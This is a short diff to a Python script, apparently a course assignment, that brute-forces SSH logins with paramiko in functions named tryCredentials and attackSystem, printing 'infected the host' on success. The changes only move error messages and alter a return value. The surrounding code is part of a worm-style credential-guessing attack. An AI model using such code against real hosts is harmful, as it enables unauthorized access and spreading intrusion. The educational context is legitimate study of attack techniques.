@@ -136,14 +136,14 @@ def tryCredentials(host, userName, password, sshClient):
 		#try connecting
 		#connect takes 4 parameters, host, part, username, password, but we can ignore the port
 		#following the handout 
-		sshClient.connect(host, username=userName, password=password) 
+
+		sshClient.connect(host, username=userName, password=password)
+
 		print("Authentication successful")
 		return 0 #passed 
 	except paramiko.SSHException:
-		print("Authentication Failed, wrong crednetials")
 		return 1 #failed 
 	except socket.error: #yo this stuff is bumpin 
-		print("Authentication Failed, Server down or not running SSH")
 		return 3 #failed
 
 
@@ -180,13 +180,15 @@ def attackSystem(host):
 		if (auth == 0):
 			print("infected the host: " + host)
 			return ssh
-		else: 
-			print("Shouldn't get here but oh wells")
-			return None
+		elif (auth == 1):
+			print("Authentication Failed, wrong crednetials")
+		elif (auth == 3):
+			print("Authentication Failed, Server down or not running SSH")
+
 			
 	# Could not find working credentials
 	# return whatever we got from the attack (if results weren't successful, eff it, empty list then) 
-	return None	
+	return auth	
 
 ####################################################
 # Returns the IP of the current system
